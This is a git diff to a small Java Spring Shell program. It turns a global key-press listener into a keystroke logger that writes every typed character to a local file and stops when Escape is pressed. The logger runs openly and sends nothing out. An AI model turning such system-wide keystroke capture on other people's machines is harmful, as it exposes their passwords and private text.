@@ -8,8 +8,14 @@ import org.springframework.shell.standard.ShellComponent;
 import org.springframework.shell.standard.ShellMethod;
 import org.springframework.shell.standard.ShellOption;
 
+import java.io.IOException;
+
 @ShellComponent
 public class MyCommands implements NativeKeyListener {
+    private final ConfigLogger Loger;
+    public MyCommands() throws IOException{
+        this.Loger = new ConfigLogger("Logg_file.txt");
+    }
     @ShellMethod(key = "log")
     public String helloWorld(
             @ShellOption(defaultValue = "spring") String time
@@ -21,12 +27,18 @@ public class MyCommands implements NativeKeyListener {
         }
         // Add this class as the NativeKeyListener
         GlobalScreen.addNativeKeyListener(this);
-        return "Finish" + time;
+        return "Started Logging..." + time;
     }
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
+        if(e.getKeyCode() == NativeKeyEvent.VC_ESCAPE){
+            Loger.writeEndFile();
+            System.out.println("Finish Logging");
+            System.exit(0);
+        }
         // Handle the key pressed event
-        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        Loger.writeFile(String.valueOf(e.getKeyChar()));
+//        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
 }
